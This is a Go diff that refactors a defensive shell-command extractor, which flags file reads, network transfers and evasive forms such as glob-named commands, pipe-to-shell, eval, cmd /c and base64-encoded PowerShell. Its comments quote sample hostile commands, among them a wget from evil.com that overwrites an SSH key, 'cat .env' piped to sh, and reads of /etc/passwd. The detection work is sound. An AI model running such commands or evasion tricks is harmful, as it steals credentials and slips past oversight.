@@ -275,341 +275,431 @@ func (e *Extractor) extractFromParsedCommandsDepth(info *ExtractedInfo, commands
 		// match interpreter maps that use bare names ("python", "bash", etc.).
 		cmdBaseName := strings.TrimSuffix(lookupName, ".exe")
 
-		// SECURITY: Glob patterns in command name position (e.g., /???/??t, ca?)
-		// bypass command DB lookup since the glob doesn't match literal entries.
-		// In dry-run mode the interpreter can't expand globs (no filesystem).
-		// Flag as evasive and conservatively extract all non-flag args as paths
-		// (we can't know which are paths vs values). Also infer the worst-case
-		// operation from matching commands.
-		if strings.ContainsAny(cmdName, "*?[") {
-			info.Evasive = true
-			info.EvasiveReason = fmt.Sprintf("command %q uses a wildcard pattern — unable to determine the actual program", cmdName)
-			for _, arg := range args {
-				if arg != "" && !strings.HasPrefix(arg, "-") {
-					info.Paths = append(info.Paths, arg)
-				}
-			}
-			// Also extract hosts (could be a network command)
-			info.Hosts = append(info.Hosts, extractHosts(args)...)
-			// Infer worst-case operation from glob-matching command DB entries
-			e.inferGlobOperation(info, cmdName)
+		e.detectGlobCommand(info, cmdName, args)
+
+		if e.handleShellInterpreter(info, commands, cmdIdx, cmdBaseName, args, depth, parentSymtab, pc.Args) {
+			continue
+		}
+		if e.handleCmdExe(info, cmdBaseName, args, depth, parentSymtab) {
+			continue
+		}
+		if e.handleEvalCommand(info, cmdName, args, depth, parentSymtab, pc.Args) {
+			continue
+		}
+		if e.handlePipeToXargs(info, commands, cmdIdx, origCmdBase, cmdName, lookupName) {
+			continue
+		}
+		if e.handlePowerShellIEX(info, cmdBaseName, args, depth, parentSymtab) {
+			continue
+		}
+		if e.handlePowerShellInterpreter(info, cmdBaseName, args, depth, parentSymtab) {
+			continue
 		}
 
-		// Recursively parse "bash -c '...'" / "sh -c '...'" arguments.
-		// Parse and expand inner command with propagated symtab in a single pass.
-		if shellInterpreters[cmdBaseName] && depth < maxShellRecursionDepth {
-			if innerCmd := extractFlagValue(args, "-c"); innerCmd != "" {
-				// Merge env KEY=VALUE args from the wrapper into the symtab
-				innerSymtab := mergeEnvArgs(pc.Args, parentSymtab)
-				// Parse and expand inner command with propagated symtab
-				parsed, resolvedSymtab := e.parseShellCommandsExpand(innerCmd, innerSymtab)
+		e.detectCmdSubstEvasion(info, pc, cmdName, lookupName, args)
+		found := e.extractFromCommandDB(info, cmdName, lookupName, args)
+		e.extractUnknownCommandPaths(info, origCmdBase, args, found)
+		e.extractInterpreterAndRedirects(info, cmdBaseName, args, pc)
+	}
+}
+
+// detectGlobCommand flags commands with glob patterns in the command name position
+// as evasive and conservatively extracts all non-flag args as paths.
+func (e *Extractor) detectGlobCommand(info *ExtractedInfo, cmdName string, args []string) {
+	// SECURITY: Glob patterns in command name position (e.g., /???/??t, ca?)
+	// bypass command DB lookup since the glob doesn't match literal entries.
+	// In dry-run mode the interpreter can't expand globs (no filesystem).
+	// Flag as evasive and conservatively extract all non-flag args as paths
+	// (we can't know which are paths vs values). Also infer the worst-case
+	// operation from matching commands.
+	if strings.ContainsAny(cmdName, "*?[") {
+		info.Evasive = true
+		info.EvasiveReason = fmt.Sprintf("command %q uses a wildcard pattern — unable to determine the actual program", cmdName)
+		for _, arg := range args {
+			if arg != "" && !strings.HasPrefix(arg, "-") {
+				info.Paths = append(info.Paths, arg)
+			}
+		}
+		// Also extract hosts (could be a network command)
+		info.Hosts = append(info.Hosts, extractHosts(args)...)
+		// Infer worst-case operation from glob-matching command DB entries
+		e.inferGlobOperation(info, cmdName)
+	}
+}
+
+// handleShellInterpreter handles "bash -c '...'" / "sh -c '...'" recursion and
+// pipe-to-shell detection. Returns true if the caller should continue (skip the
+// rest of the loop iteration).
+func (e *Extractor) handleShellInterpreter(info *ExtractedInfo, commands []parsedCommand, cmdIdx int, cmdBaseName string, args []string, depth int, parentSymtab map[string]string, pcArgs []string) bool {
+	// Recursively parse "bash -c '...'" / "sh -c '...'" arguments.
+	// Parse and expand inner command with propagated symtab in a single pass.
+	if !shellInterpreters[cmdBaseName] || depth >= maxShellRecursionDepth {
+		return false
+	}
+
+	if innerCmd := extractFlagValue(args, "-c"); innerCmd != "" {
+		// Merge env KEY=VALUE args from the wrapper into the symtab
+		innerSymtab := mergeEnvArgs(pcArgs, parentSymtab)
+		// Parse and expand inner command with propagated symtab
+		parsed, resolvedSymtab := e.parseShellCommandsExpand(innerCmd, innerSymtab)
+		if len(parsed) > 0 {
+			e.extractFromParsedCommandsDepth(info, parsed, depth+1, resolvedSymtab)
+			return true
+		}
+	}
+
+	// SECURITY: Pipe-to-shell detection.
+	// "echo 'cat .env' | sh" — the runner captures [echo, sh] as separate
+	// parsedCommands but doesn't pipe data between them. The bare shell
+	// (no -c, no args) receives nothing via stdin in dry-run mode.
+	// Fix: when we see a bare shell interpreter, scan ALL commands in the
+	// list for echo/printf (pipe stages run in goroutines so their order
+	// in the commands slice is non-deterministic).
+	if len(args) == 0 {
+		found := false
+		for j := range commands {
+			if j == cmdIdx {
+				continue
+			}
+			other := commands[j]
+			otherName, otherArgs := e.resolveCommand(other.Name, other.Args)
+			if (otherName == "echo" || otherName == "printf") && len(otherArgs) > 0 {
+				pipedCmd := strings.Join(otherArgs, " ")
+				parsed, resolvedSymtab := e.parseShellCommandsExpand(pipedCmd, parentSymtab)
 				if len(parsed) > 0 {
 					e.extractFromParsedCommandsDepth(info, parsed, depth+1, resolvedSymtab)
-					continue
-				}
-			}
-
-			// SECURITY: Pipe-to-shell detection.
-			// "echo 'cat .env' | sh" — the runner captures [echo, sh] as separate
-			// parsedCommands but doesn't pipe data between them. The bare shell
-			// (no -c, no args) receives nothing via stdin in dry-run mode.
-			// Fix: when we see a bare shell interpreter, scan ALL commands in the
-			// list for echo/printf (pipe stages run in goroutines so their order
-			// in the commands slice is non-deterministic).
-			if len(args) == 0 {
-				found := false
-				for j := range commands {
-					if j == cmdIdx {
-						continue
-					}
-					other := commands[j]
-					otherName, otherArgs := e.resolveCommand(other.Name, other.Args)
-					if (otherName == "echo" || otherName == "printf") && len(otherArgs) > 0 {
-						pipedCmd := strings.Join(otherArgs, " ")
-						parsed, resolvedSymtab := e.parseShellCommandsExpand(pipedCmd, parentSymtab)
-						if len(parsed) > 0 {
-							e.extractFromParsedCommandsDepth(info, parsed, depth+1, resolvedSymtab)
-							found = true
-						}
-					}
-				}
-				if found {
-					continue
+					found = true
 				}
 			}
 		}
+		if found {
+			return true
+		}
+	}
 
-		// cmd.exe /c and /k: recursively parse the inner command string.
-		// "cmd /c type C:\file" → inner = "type C:\file" parsed as sub-commands.
-		// WSL is in wrapperCommands so "wsl cat /path" already resolves to "cat"
-		// before reaching here; cmd.exe needs dedicated handling because /c
-		// consumes all remaining args (not just the next one).
-		if cmdBaseName == "cmd" && depth < maxShellRecursionDepth {
-			cmdHandled := false
-			for i, arg := range args {
-				if fl := strings.ToLower(arg); (fl == "/c" || fl == "/k") && i+1 < len(args) {
-					innerCmd := strings.Join(args[i+1:], " ")
-					parsed, resolvedSymtab := e.parseShellCommandsExpand(innerCmd, parentSymtab)
-					if len(parsed) > 0 {
-						e.extractFromParsedCommandsDepth(info, parsed, depth+1, resolvedSymtab)
-						cmdHandled = true
-					}
+	return false
+}
+
+// handleCmdExe handles cmd.exe /c and /k by recursively parsing the inner command
+// string. Returns true if the caller should continue.
+func (e *Extractor) handleCmdExe(info *ExtractedInfo, cmdBaseName string, args []string, depth int, parentSymtab map[string]string) bool {
+	// cmd.exe /c and /k: recursively parse the inner command string.
+	// "cmd /c type C:\file" → inner = "type C:\file" parsed as sub-commands.
+	// WSL is in wrapperCommands so "wsl cat /path" already resolves to "cat"
+	// before reaching here; cmd.exe needs dedicated handling because /c
+	// consumes all remaining args (not just the next one).
+	if cmdBaseName != "cmd" || depth >= maxShellRecursionDepth {
+		return false
+	}
+
+	cmdHandled := false
+	for i, arg := range args {
+		if fl := strings.ToLower(arg); (fl == "/c" || fl == "/k") && i+1 < len(args) {
+			innerCmd := strings.Join(args[i+1:], " ")
+			parsed, resolvedSymtab := e.parseShellCommandsExpand(innerCmd, parentSymtab)
+			if len(parsed) > 0 {
+				e.extractFromParsedCommandsDepth(info, parsed, depth+1, resolvedSymtab)
+				cmdHandled = true
+			}
+			break
+		}
+	}
+	return cmdHandled
+}
+
+// handleEvalCommand handles "eval '...'" by recursively parsing the concatenated
+// arguments as shell code. Returns true if the caller should continue.
+func (e *Extractor) handleEvalCommand(info *ExtractedInfo, cmdName string, args []string, depth int, parentSymtab map[string]string, pcArgs []string) bool {
+	// SECURITY: Pipe-to-xargs/parallel detection.
+	// Recursively parse "eval '...'" — eval concatenates all args and
+	// executes them as shell code, similar to "sh -c '...'".
+	if cmdName != "eval" || depth >= maxShellRecursionDepth || len(args) == 0 {
+		return false
+	}
+
+	innerCmd := strings.Join(args, " ")
+	innerSymtab := mergeEnvArgs(pcArgs, parentSymtab)
+	parsed, resolvedSymtab := e.parseShellCommandsExpand(innerCmd, innerSymtab)
+	if len(parsed) > 0 {
+		e.extractFromParsedCommandsDepth(info, parsed, depth+1, resolvedSymtab)
+		return true
+	}
+	return false
+}
+
+// handlePipeToXargs handles "echo /path/.env | xargs cat" by scanning for
+// echo/printf pipe stages and treating their args as file paths for the
+// unwrapped command. Returns true if the caller should continue.
+func (e *Extractor) handlePipeToXargs(info *ExtractedInfo, commands []parsedCommand, cmdIdx int, origBase string, cmdName string, lookupName string) bool {
+	// "echo /path/.env | xargs cat" — xargs reads paths from stdin and
+	// passes them as args to the wrapped command. The runner captures
+	// [echo, xargs] as separate parsedCommands but doesn't pipe data.
+	// Fix: when we see a stdin-arg wrapper (xargs/parallel) that was
+	// unwrapped to a known command, scan for echo/printf and treat their
+	// args as file paths for the unwrapped command. No arg-count check:
+	// xargs ALWAYS appends stdin items as additional args even when the
+	// wrapped command has explicit args (e.g., "xargs rm -f", "xargs cat 0").
+	if !stdinArgWrappers[origBase] || cmdName == origBase {
+		return false
+	}
+
+	dbInfo, ok := e.commandDB[lookupName]
+	if !ok {
+		return false
+	}
+
+	found := false
+	for j := range commands {
+		if j == cmdIdx {
+			continue
+		}
+		other := commands[j]
+		otherName, otherArgs := e.resolveCommand(other.Name, other.Args)
+		if (otherName == "echo" || otherName == "printf") && len(otherArgs) > 0 {
+			for _, arg := range otherArgs {
+				// Skip echo flags (-n, -e, -E)
+				if strings.HasPrefix(arg, "-") {
+					continue
+				}
+				info.Paths = append(info.Paths, arg)
+			}
+			info.addOperation(dbInfo.Operation)
+			for _, op := range dbInfo.ExtraOps {
+				info.appendExtraOp(op)
+			}
+			found = true
+		}
+	}
+	return found
+}
+
+// handlePowerShellIEX handles "Invoke-Expression 'Get-Content /etc/passwd'" and
+// "iex -Command 'Get-Content /etc/passwd'". Returns true if the caller should continue.
+func (e *Extractor) handlePowerShellIEX(info *ExtractedInfo, cmdBaseName string, args []string, depth int, parentSymtab map[string]string) bool {
+	// Recursively parse "Invoke-Expression 'Get-Content /etc/passwd'" and
+	// "iex -Command 'Get-Content /etc/passwd'". Both cmdlets execute arbitrary
+	// PowerShell code — treat the code string as an inner command to inspect.
+	// This handles "Invoke-Expression -Command <code>" (flag form) and
+	// "Invoke-Expression <code>" (positional form, the common idiom).
+	if (cmdBaseName != "invoke-expression" && cmdBaseName != "iex") || depth >= maxShellRecursionDepth {
+		return false
+	}
+
+	innerCmd := extractFlagValueCaseInsensitive(args, "-Command")
+	if innerCmd == "" && len(args) > 0 {
+		innerCmd = args[0] // positional: iex 'Get-Content /etc/passwd'
+	}
+	if innerCmd != "" {
+		e.parsePowerShellInnerCommand(info, innerCmd, depth, parentSymtab)
+		return true
+	}
+	return false
+}
+
+// handlePowerShellInterpreter handles "powershell -Command '...'" / "pwsh -c '...'"
+// and -EncodedCommand/-ec. Returns true if the caller should continue.
+func (e *Extractor) handlePowerShellInterpreter(info *ExtractedInfo, cmdBaseName string, args []string, depth int, parentSymtab map[string]string) bool {
+	// Recursively parse "powershell -Command '...'" / "pwsh -c '...'".
+	// Separate from shellInterpreters because inner code is PowerShell, not POSIX sh.
+	if !powershellInterpreters[cmdBaseName] || depth >= maxShellRecursionDepth {
+		return false
+	}
+
+	// Check -Command / -c (case-insensitive — PowerShell flags are case-insensitive)
+	innerCmd := extractFlagRestCaseInsensitive(args, "-Command")
+	if innerCmd == "" {
+		innerCmd = extractFlagRestCaseInsensitive(args, "-c")
+	}
+	if innerCmd != "" {
+		e.parsePowerShellInnerCommand(info, innerCmd, depth, parentSymtab)
+		return true
+	}
+
+	// Check -EncodedCommand / -ec (case-insensitive)
+	encodedVal := extractFlagValueCaseInsensitive(args, "-EncodedCommand")
+	if encodedVal == "" {
+		encodedVal = extractFlagValueCaseInsensitive(args, "-ec")
+	}
+	if encodedVal != "" {
+		decoded, ok := decodePowerShellEncodedCommand(encodedVal)
+		if ok && decoded != "" {
+			info.Evasive = true
+			info.EvasiveReason = "PowerShell command is hidden in base64 encoding: " + decoded
+			e.parsePowerShellInnerCommand(info, decoded, depth, parentSymtab)
+		} else {
+			info.Evasive = true
+			info.EvasiveReason = "PowerShell encoded command could not be decoded: " + encodedVal
+		}
+		return true
+	}
+
+	// No -Command or -EncodedCommand found.
+	// Fall through to command DB lookup for -File and positional args.
+	return false
+}
+
+// detectCmdSubstEvasion detects when a command's arguments were assigned from a
+// command substitution and resolved to empty in dry-run, making the actual targets
+// invisible to static analysis.
+func (e *Extractor) detectCmdSubstEvasion(info *ExtractedInfo, pc parsedCommand, cmdName string, lookupName string, args []string) {
+	// SECURITY (Bug 9): When a command's arguments were assigned from a
+	// command substitution (e.g., path=$(cat /secret); curl $path), the
+	// dry-run interpreter returns empty output for external commands, so
+	// $path expands to "". The target URL/path is invisible to static
+	// analysis. Detect this: if HasSubst=true (the arg used a CmdSubst-
+	// assigned variable or a direct CmdSubst) AND the command has no args
+	// after expansion AND it is a network or execute command, flag evasive.
+	// HasSubst is now per-command (not file-wide), so this only fires when
+	// THIS command's args specifically had dynamic content.
+	if pc.HasSubst && len(args) == 0 {
+		if dbInfo, inDB := e.commandDB[lookupName]; inDB {
+			allOps := dbInfo.AllOperations()
+			isDangerousSubst := false
+			for _, op := range allOps {
+				if op == OpNetwork || op == OpExecute {
+					isDangerousSubst = true
 					break
 				}
 			}
-			if cmdHandled {
-				continue
-			}
-		}
-
-		// SECURITY: Pipe-to-xargs/parallel detection.
-		// Recursively parse "eval '...'" — eval concatenates all args and
-		// executes them as shell code, similar to "sh -c '...'".
-		if cmdName == "eval" && depth < maxShellRecursionDepth && len(args) > 0 {
-			innerCmd := strings.Join(args, " ")
-			innerSymtab := mergeEnvArgs(pc.Args, parentSymtab)
-			parsed, resolvedSymtab := e.parseShellCommandsExpand(innerCmd, innerSymtab)
-			if len(parsed) > 0 {
-				e.extractFromParsedCommandsDepth(info, parsed, depth+1, resolvedSymtab)
-				continue
-			}
-		}
-
-		// "echo /path/.env | xargs cat" — xargs reads paths from stdin and
-		// passes them as args to the wrapped command. The runner captures
-		// [echo, xargs] as separate parsedCommands but doesn't pipe data.
-		// Fix: when we see a stdin-arg wrapper (xargs/parallel) that was
-		// unwrapped to a known command, scan for echo/printf and treat their
-		// args as file paths for the unwrapped command. No arg-count check:
-		// xargs ALWAYS appends stdin items as additional args even when the
-		// wrapped command has explicit args (e.g., "xargs rm -f", "xargs cat 0").
-		origBase := stripPathPrefix(pc.Name)
-		if stdinArgWrappers[origBase] && cmdName != origBase {
-			if dbInfo, ok := e.commandDB[lookupName]; ok {
-				found := false
-				for j := range commands {
-					if j == cmdIdx {
-						continue
-					}
-					other := commands[j]
-					otherName, otherArgs := e.resolveCommand(other.Name, other.Args)
-					if (otherName == "echo" || otherName == "printf") && len(otherArgs) > 0 {
-						for _, arg := range otherArgs {
-							// Skip echo flags (-n, -e, -E)
-							if strings.HasPrefix(arg, "-") {
-								continue
-							}
-							info.Paths = append(info.Paths, arg)
-						}
-						info.addOperation(dbInfo.Operation)
-						for _, op := range dbInfo.ExtraOps {
-							info.appendExtraOp(op)
-						}
-						found = true
-					}
+			if isDangerousSubst {
+				info.addOperation(dbInfo.Operation)
+				for _, op := range dbInfo.ExtraOps {
+					info.appendExtraOp(op)
 				}
-				if found {
+				if !info.Evasive {
+					info.Evasive = true
+					info.EvasiveReason = fmt.Sprintf(
+						"command %q has arguments from command substitution that resolved to empty in dry-run; actual targets cannot be determined statically",
+						cmdName)
+				}
+			}
+		}
+	}
+}
+
+// extractFromCommandDB looks up a command in the command database and extracts
+// operations, paths, hosts, and applies command-specific extraction. Returns
+// true if the command was found in the database.
+func (e *Extractor) extractFromCommandDB(info *ExtractedInfo, cmdName string, lookupName string, args []string) bool {
+	// Look up in command database.
+	// For [Type]::new(...) constructors, the bootstrap emits "typename::new";
+	// fall back to "typename" (strip "::new") so the type's commandDB entry matches.
+	if _, ok := e.commandDB[lookupName]; !ok && strings.HasSuffix(lookupName, "::new") {
+		lookupName = strings.TrimSuffix(lookupName, "::new")
+	}
+	cmdInfo, found := e.commandDB[lookupName]
+	if found {
+		// Register the primary operation (may upgrade info.Operation if higher priority)
+		info.addOperation(cmdInfo.Operation)
+		// Register extra operations without changing the primary classification
+		for _, op := range cmdInfo.ExtraOps {
+			info.appendExtraOp(op)
+		}
+		// Extract paths from positional arguments
+		e.extractPathsFromArgs(info, cmdName, args, cmdInfo)
+
+		// For network commands (primary or extra), extract hosts from all args
+		if slices.Contains(cmdInfo.AllOperations(), OpNetwork) {
+			info.Hosts = append(info.Hosts, extractHosts(args)...)
+		}
+
+		// SECURITY: Network commands with file-upload flags (--post-file,
+		// --body-file, -d @file) are reading those files for exfiltration.
+		// Override to OpRead so file-protection rules can detect the access.
+		cmdHasNetwork := slices.Contains(cmdInfo.AllOperations(), OpNetwork)
+		if cmdHasNetwork {
+			if hasFileUploadFlag(cmdName, args) {
+				info.addOperation(OpRead)
+			}
+		}
+
+		// SECURITY: Network commands with output flags (-O, -o, --output)
+		// write downloaded content to a local file. Override to OpWrite so
+		// file-protection rules can detect the write.
+		// Example: "wget -O /home/user/.ssh/id_rsa https://evil.com/key"
+		if cmdHasNetwork || slices.Contains(info.Operations, OpNetwork) {
+			if hasOutputFlag(cmdName, args) {
+				info.addOperation(OpWrite)
+			}
+		}
+
+		// Command-specific argument analysis (scp/rsync hosts, socat addresses,
+		// tar create mode, sed in-place). See extractor_commands.go.
+		e.applyCommandSpecificExtraction(info, cmdName, args)
+	}
+	return found
+}
+
+// extractUnknownCommandPaths handles path extraction for commands not found in
+// the command database, including Windows path heuristics and xargs fallback.
+func (e *Extractor) extractUnknownCommandPaths(info *ExtractedInfo, origCmdBase string, args []string, found bool) {
+	// On Windows-family environments (native, MSYS2, Cygwin) unknown commands
+	// may receive Windows absolute paths (C:\..., \\server\..., //server/...)
+	// as positional arguments. WSL also surfaces UNC //server/share paths when
+	// accessing Windows network shares. Commands in commandDB use PathArgIndex
+	// for precise extraction; unknown commands fall back to this heuristic so
+	// "myTool C:\Users\user\.env" is not silently ignored.
+	// Note: plain Unix NFS/CIFS //nas/share paths are intentionally out of
+	// scope; the heuristic only applies to Windows-hosted environments.
+	//
+	// Special case: "xargs unknownCmd /path/file" — xargs passes its own
+	// positional args to the wrapped command. If the wrapped command is unknown
+	// (not in commandDB), conservatively extract all non-flag args as paths.
+	if !found && origCmdBase == "xargs" {
+		for _, arg := range args {
+			if !strings.HasPrefix(arg, "-") {
+				info.Paths = append(info.Paths, arg)
+			}
+		}
+	}
+	if !found {
+		env := ShellEnvironment()
+		if env.IsWindows() || env == EnvWSL {
+			for _, arg := range args {
+				if strings.HasPrefix(arg, "-") {
 					continue
 				}
-			}
-		}
-
-		// Recursively parse "Invoke-Expression 'Get-Content /etc/passwd'" and
-		// "iex -Command 'Get-Content /etc/passwd'". Both cmdlets execute arbitrary
-		// PowerShell code — treat the code string as an inner command to inspect.
-		// This handles "Invoke-Expression -Command <code>" (flag form) and
-		// "Invoke-Expression <code>" (positional form, the common idiom).
-		if (cmdBaseName == "invoke-expression" || cmdBaseName == "iex") && depth < maxShellRecursionDepth {
-			innerCmd := extractFlagValueCaseInsensitive(args, "-Command")
-			if innerCmd == "" && len(args) > 0 {
-				innerCmd = args[0] // positional: iex 'Get-Content /etc/passwd'
-			}
-			if innerCmd != "" {
-				e.parsePowerShellInnerCommand(info, innerCmd, depth, parentSymtab)
-				continue
-			}
-		}
-
-		// Recursively parse "powershell -Command '...'" / "pwsh -c '...'".
-		// Separate from shellInterpreters because inner code is PowerShell, not POSIX sh.
-		if powershellInterpreters[cmdBaseName] && depth < maxShellRecursionDepth {
-			// Check -Command / -c (case-insensitive — PowerShell flags are case-insensitive)
-			innerCmd := extractFlagRestCaseInsensitive(args, "-Command")
-			if innerCmd == "" {
-				innerCmd = extractFlagRestCaseInsensitive(args, "-c")
-			}
-			if innerCmd != "" {
-				e.parsePowerShellInnerCommand(info, innerCmd, depth, parentSymtab)
-				continue
-			}
-
-			// Check -EncodedCommand / -ec (case-insensitive)
-			encodedVal := extractFlagValueCaseInsensitive(args, "-EncodedCommand")
-			if encodedVal == "" {
-				encodedVal = extractFlagValueCaseInsensitive(args, "-ec")
-			}
-			if encodedVal != "" {
-				decoded, ok := decodePowerShellEncodedCommand(encodedVal)
-				if ok && decoded != "" {
-					info.Evasive = true
-					info.EvasiveReason = "PowerShell command is hidden in base64 encoding: " + decoded
-					e.parsePowerShellInnerCommand(info, decoded, depth, parentSymtab)
-				} else {
-					info.Evasive = true
-					info.EvasiveReason = "PowerShell encoded command could not be decoded: " + encodedVal
-				}
-				continue
-			}
-
-			// No -Command or -EncodedCommand found.
-			// Fall through to command DB lookup for -File and positional args.
-		}
-
-		// SECURITY (Bug 9): When a command's arguments were assigned from a
-		// command substitution (e.g., path=$(cat /secret); curl $path), the
-		// dry-run interpreter returns empty output for external commands, so
-		// $path expands to "". The target URL/path is invisible to static
-		// analysis. Detect this: if HasSubst=true (the arg used a CmdSubst-
-		// assigned variable or a direct CmdSubst) AND the command has no args
-		// after expansion AND it is a network or execute command, flag evasive.
-		// HasSubst is now per-command (not file-wide), so this only fires when
-		// THIS command's args specifically had dynamic content.
-		if pc.HasSubst && len(args) == 0 {
-			if dbInfo, inDB := e.commandDB[lookupName]; inDB {
-				allOps := dbInfo.AllOperations()
-				isDangerousSubst := false
-				for _, op := range allOps {
-					if op == OpNetwork || op == OpExecute {
-						isDangerousSubst = true
-						break
-					}
-				}
-				if isDangerousSubst {
-					info.addOperation(dbInfo.Operation)
-					for _, op := range dbInfo.ExtraOps {
-						info.appendExtraOp(op)
-					}
-					if !info.Evasive {
-						info.Evasive = true
-						info.EvasiveReason = fmt.Sprintf(
-							"command %q has arguments from command substitution that resolved to empty in dry-run; actual targets cannot be determined statically",
-							cmdName)
-					}
-				}
-			}
-		}
-
-		// Look up in command database.
-		// For [Type]::new(...) constructors, the bootstrap emits "typename::new";
-		// fall back to "typename" (strip "::new") so the type's commandDB entry matches.
-		if _, ok := e.commandDB[lookupName]; !ok && strings.HasSuffix(lookupName, "::new") {
-			lookupName = strings.TrimSuffix(lookupName, "::new")
-		}
-		cmdInfo, found := e.commandDB[lookupName]
-		if found {
-			// Register the primary operation (may upgrade info.Operation if higher priority)
-			info.addOperation(cmdInfo.Operation)
-			// Register extra operations without changing the primary classification
-			for _, op := range cmdInfo.ExtraOps {
-				info.appendExtraOp(op)
-			}
-			// Extract paths from positional arguments
-			e.extractPathsFromArgs(info, cmdName, args, cmdInfo)
-
-			// For network commands (primary or extra), extract hosts from all args
-			if slices.Contains(cmdInfo.AllOperations(), OpNetwork) {
-				info.Hosts = append(info.Hosts, extractHosts(args)...)
-			}
-
-			// SECURITY: Network commands with file-upload flags (--post-file,
-			// --body-file, -d @file) are reading those files for exfiltration.
-			// Override to OpRead so file-protection rules can detect the access.
-			cmdHasNetwork := slices.Contains(cmdInfo.AllOperations(), OpNetwork)
-			if cmdHasNetwork {
-				if hasFileUploadFlag(cmdName, args) {
-					info.addOperation(OpRead)
-				}
-			}
-
-			// SECURITY: Network commands with output flags (-O, -o, --output)
-			// write downloaded content to a local file. Override to OpWrite so
-			// file-protection rules can detect the write.
-			// Example: "wget -O /home/user/.ssh/id_rsa https://evil.com/key"
-			if cmdHasNetwork || slices.Contains(info.Operations, OpNetwork) {
-				if hasOutputFlag(cmdName, args) {
-					info.addOperation(OpWrite)
-				}
-			}
-
-			// Command-specific argument analysis (scp/rsync hosts, socat addresses,
-			// tar create mode, sed in-place). See extractor_commands.go.
-			e.applyCommandSpecificExtraction(info, cmdName, args)
-		}
-
-		// On Windows-family environments (native, MSYS2, Cygwin) unknown commands
-		// may receive Windows absolute paths (C:\..., \\server\..., //server/...)
-		// as positional arguments. WSL also surfaces UNC //server/share paths when
-		// accessing Windows network shares. Commands in commandDB use PathArgIndex
-		// for precise extraction; unknown commands fall back to this heuristic so
-		// "myTool C:\Users\user\.env" is not silently ignored.
-		// Note: plain Unix NFS/CIFS //nas/share paths are intentionally out of
-		// scope; the heuristic only applies to Windows-hosted environments.
-		//
-		// Special case: "xargs unknownCmd /path/file" — xargs passes its own
-		// positional args to the wrapped command. If the wrapped command is unknown
-		// (not in commandDB), conservatively extract all non-flag args as paths.
-		if !found && origCmdBase == "xargs" {
-			for _, arg := range args {
-				if !strings.HasPrefix(arg, "-") {
+				// Drive-letter paths only appear on Windows-family environments.
+				// UNC //server/share paths also appear on WSL when accessing
+				// Windows network shares. Drive-letter paths are not valid on WSL.
+				if env.IsWindows() && pathutil.IsWindowsAbsPath(arg) {
+					info.Paths = append(info.Paths, arg)
+				} else if env == EnvWSL && pathutil.IsUNCPath(arg) {
 					info.Paths = append(info.Paths, arg)
 				}
 			}
 		}
-		if !found {
-			env := ShellEnvironment()
-			if env.IsWindows() || env == EnvWSL {
-				for _, arg := range args {
-					if strings.HasPrefix(arg, "-") {
-						continue
-					}
-					// Drive-letter paths only appear on Windows-family environments.
-					// UNC //server/share paths also appear on WSL when accessing
-					// Windows network shares. Drive-letter paths are not valid on WSL.
-					if env.IsWindows() && pathutil.IsWindowsAbsPath(arg) {
-						info.Paths = append(info.Paths, arg)
-					} else if env == EnvWSL && pathutil.IsUNCPath(arg) {
-						info.Paths = append(info.Paths, arg)
-					}
-				}
+	}
+}
+
+// extractInterpreterAndRedirects extracts paths from interpreter code strings
+// (python -c, perl -e, etc.) and redirect targets/sources.
+func (e *Extractor) extractInterpreterAndRedirects(info *ExtractedInfo, cmdBaseName string, args []string, pc parsedCommand) {
+	// Extract paths from interpreter code strings (python -c, perl -e, etc.)
+	// When file paths are found in interpreter code, force OpRead as primary
+	// regardless of the command DB operation. "python3 -c 'open(.env)'" is
+	// primarily a file read — file-protection rules (actions:[read]) must fire.
+	// forceOperation keeps OpExecute in Operations so execute rules also fire.
+	if flag, ok := interpreterCodeFlags[cmdBaseName]; ok {
+		if code := extractFlagValue(args, flag); code != "" {
+			paths := extractPathsFromInterpreterCode(code)
+			if len(paths) > 0 {
+				info.Paths = append(info.Paths, paths...)
+				info.forceOperation(OpRead)
 			}
 		}
+	}
 
-		// Extract paths from interpreter code strings (python -c, perl -e, etc.)
-		// When file paths are found in interpreter code, force OpRead as primary
-		// regardless of the command DB operation. "python3 -c 'open(.env)'" is
-		// primarily a file read — file-protection rules (actions:[read]) must fire.
-		// forceOperation keeps OpExecute in Operations so execute rules also fire.
-		if flag, ok := interpreterCodeFlags[cmdBaseName]; ok {
-			if code := extractFlagValue(args, flag); code != "" {
-				paths := extractPathsFromInterpreterCode(code)
-				if len(paths) > 0 {
-					info.Paths = append(info.Paths, paths...)
-					info.forceOperation(OpRead)
-				}
-			}
-		}
+	// Add output redirect target paths (always a write)
+	if len(pc.RedirPaths) > 0 {
+		info.Paths = append(info.Paths, pc.RedirPaths...)
+		info.addOperation(OpWrite)
+	}
 
-		// Add output redirect target paths (always a write)
-		if len(pc.RedirPaths) > 0 {
-			info.Paths = append(info.Paths, pc.RedirPaths...)
-			info.addOperation(OpWrite)
-		}
-
-		// Add input redirect source paths (always a read)
-		if len(pc.RedirInPaths) > 0 {
-			info.Paths = append(info.Paths, pc.RedirInPaths...)
-			info.addOperation(OpRead)
-		}
+	// Add input redirect source paths (always a read)
+	if len(pc.RedirInPaths) > 0 {
+		info.Paths = append(info.Paths, pc.RedirInPaths...)
+		info.addOperation(OpRead)
 	}
 }
 
